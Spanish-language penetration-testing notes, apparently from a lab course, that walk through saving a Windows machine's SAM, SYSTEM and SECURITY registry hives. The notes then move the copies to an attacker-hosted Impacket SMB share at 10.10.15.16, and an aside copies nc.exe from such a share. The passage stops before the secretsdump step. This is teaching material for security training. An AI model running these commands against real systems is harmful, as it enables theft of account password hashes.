Con acceso a un sistema Windows sin dominio, podemos beneficiarnos al intentar volcar rápidamente los archivos asociados con la base de datos SAM para transferirlos a nuestro host de ataque y comenzar a descifrar hashes sin conexión. Hacer esto sin conexión garantizará que podamos continuar intentando nuestros ataques sin mantener una sesión activa con un objetivo. 

#### Copying SAM Registry Hives

Hay tres colmenas de registro que podemos copiar si tenemos acceso de administrador local en el destino; cada uno tendrá un propósito específico cuando lleguemos a desechar y descifrar los hashes. Aquí hay una breve descripción de cada uno en la siguiente tabla:


| Registry Hive   | Description                                                                                                                                                                                       |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                 |                                                                                                                                                                                                   |
| `hklm\sam`      | Contiene los hash asociados con las contraseñas de las cuentas locales. Necesitaremos los hashes para poder descifrarlos y obtener las contraseñas de las cuentas de usuario en texto sin cifrar. |
| `hklm\system`   | Contiene la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Necesitaremos la clave de arranque para descifrar la base de datos SAM.                               |
| `hklm\security` | Contiene credenciales almacenadas en caché para cuentas de dominio. Podemos beneficiarnos de tener esto en un destino de Windows unido a un dominio.                                              |
Podemos crear copias de seguridad de estas colmenas usando el `reg.exe` utilidad.

#### Using reg.exe save to Copy Registry Hives
Iniciar CMD como administrador nos permitirá ejecutar reg.exe para guardar copias de las colmenas de registro antes mencionadas. Ejecute estos comandos a continuación para hacerlo:
```js
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

Técnicamente sólo necesitaremos `hklm\sam` & `hklm\system`, pero `hklm\security`También puede ser útil guardarlo, ya que puede contener hashes asociados con las credenciales de cuentas de usuario de dominio almacenadas en caché presentes en hosts unidos a un dominio. Una vez que las colmenas se guardan sin conexión, podemos usar varios métodos para transferirlas a nuestro host de ataque. En este caso, usemos [smbserver.py de Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) en combinación con algunos comandos CMD útiles para mover las copias de la colmena a un recurso compartido creado en nuestro host de ataque.

#### Creando un recurso compartido con smbserver.py
Todo lo que debemos hacer para crear el recurso compartido es ejecutar smbserver.py -smb2support usando python, darle un nombre al recurso compartido ( `CompData`) y especifique el directorio en nuestro host de ataque donde el recurso compartido almacenará las copias de la colmena ( `/home/ltnbob/Documents`). Sepa que el `smb2support`La opción garantizará que se admitan las versiones más recientes de SMB. Si no utilizamos este indicador, habrá errores al conectarnos desde el objetivo de Windows al recurso compartido alojado en nuestro host de ataque. Las versiones más recientes de Windows no son compatibles con SMBv1 de forma predeterminada debido a las [numerosas vulnerabilidades graves](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) y exploits disponibles públicamente.

```js
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Una vez que tengamos el recurso compartido ejecutándose en nuestro host de ataque, podemos usar el `move` comando en el destino de Windows para mover las copias de la colmena al recurso compartido.
#### Mover copias de Hive para compartir
```ls
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

THIS SHIT DONT WORKS!!!

Attacker
```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Victim
```
copy \\192.168.220.133\share\nc.exe
```

Luego podemos confirmar que nuestras copias de la colmena se movieron exitosamente al recurso compartido navegando al directorio compartido en nuestro host de ataque y usando `ls` para enumerar los archivos.

#### Confirmación de copias de Hive transferidas al host de ataque
```js
p314d0@htb[/htb]$ ls

sam.save  security.save  system.save
```

## Dumping Hashes with Impacket's secretsdump.py

Una herramienta increíblemente útil que podemos usar para volcar los hashes fuera de línea es Impacket. `secretsdump.py`. Impacket se puede encontrar en la mayoría de las distribuciones de pruebas de penetración modernas. Podemos comprobarlo usando `locate` en un sistema basado en Linux:

